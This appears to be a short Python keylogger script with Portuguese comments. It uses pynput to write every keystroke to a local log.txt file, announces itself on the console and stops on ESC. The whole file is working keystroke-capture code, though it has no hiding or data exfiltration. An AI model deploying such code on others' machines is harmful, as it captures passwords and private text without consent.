from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as file:
            file.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.tab:
                file.write("\t")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                file.write("[ESC]")
                print("ESC pressionado. Parando keylogger...")
                return False
            elif key in IGNORAR:
                pass    
            else:
                file.write(f"[{key}]")

print("Keylogger iniciado. Pressione ESC para parar.")

# Limpa o arquivo de log no início (sobreescreve)
with open("log.txt", "w", encoding="utf-8") as file:
    pass  # Cria arquivo vazio

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print("Keylogger parado.")